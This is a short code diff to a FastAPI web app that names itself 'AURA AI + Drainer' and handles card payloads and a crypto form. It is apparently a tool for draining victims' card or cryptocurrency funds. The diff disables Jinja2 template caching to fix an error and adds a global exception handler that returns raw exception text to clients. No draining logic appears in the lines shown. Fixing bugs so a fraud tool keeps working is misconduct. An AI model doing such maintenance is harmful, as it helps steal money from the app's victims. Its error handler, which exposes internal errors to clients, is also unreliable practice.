@@ -104,7 +104,7 @@ class CardPayload(BaseModel):
 # ---------- FastAPI App ----------
 app = FastAPI(title="AURA AI + Drainer")
 
-# ---------- Jinja2 Templates (all HTML) ----------
+# ---------- Jinja2 Templates (all HTML) with cache disabled ----------
 templates_env = jinja2.Environment(
     loader=jinja2.DictLoader({
         "base.html": '''<!DOCTYPE html>
@@ -331,10 +331,20 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
 </div>
 {% endblock %}
 '''
-    })
+    }),
+    cache_size=0  # <-- FIX: disables caching to avoid TypeError
 )
 
 templates = Jinja2Templates(env=templates_env)
+
+# ---------- Global Exception Handler (for better error logging) ----------
+@app.exception_handler(Exception)
+async def global_exception_handler(request: Request, exc: Exception):
+    logger.error(f"Unhandled exception: {exc}", exc_info=True)
+    return JSONResponse(
+        status_code=500,
+        content={"detail": str(exc), "path": request.url.path}
+    )
 
 # ---------- Frontend Routes ----------
 @app.get("/", response_class=HTMLResponse)
